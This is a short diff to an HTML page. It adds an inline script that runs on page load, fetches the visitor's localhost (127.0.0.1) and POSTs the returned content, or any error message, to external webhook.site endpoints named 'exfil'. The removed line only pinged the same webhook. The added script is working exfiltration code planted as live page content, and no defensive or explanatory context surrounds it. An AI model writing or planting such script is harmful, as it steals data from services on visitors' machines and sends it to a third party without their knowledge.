@@ -2,7 +2,20 @@
 <html>
 <body>
 <script>
-fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/').catch(()=>{});
+fetch('http://127.0.0.1')
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/exfil', {
+      method: 'POST',
+      body: data
+    });
+  })
+  .catch(e => {
+    fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/exfil-error', {
+      method: 'POST',
+      body: e.toString()
+    });
+  });
 </script>
 </body>
 </html>
